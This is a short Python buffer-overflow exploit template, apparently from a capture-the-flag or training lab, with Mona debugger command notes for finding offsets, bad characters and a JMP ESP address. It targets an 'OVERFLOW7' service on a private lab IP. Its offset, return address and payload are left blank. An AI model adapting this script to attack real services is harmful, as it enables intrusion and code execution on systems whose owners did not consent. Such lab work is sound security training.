# Mona cheatset
# !mona config -set workingfolder C:\mona\%p
# !mona findmsp -distance <distance>
# !mona bytearray -b "\x00"
# !mona compare -f C:\mona\%p\bytearray.bin -a <ESP ADDR>
# !mona jmp -r esp -cpb <badchars>


import socket

ip = "10.10.247.165"
port = 1337

prefix = "OVERFLOW7 "
offset = 0
overflow = "A" * offset
retn = ""
padding = "" # "\x90" * 16
# \x00\x08\x2c\xad
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
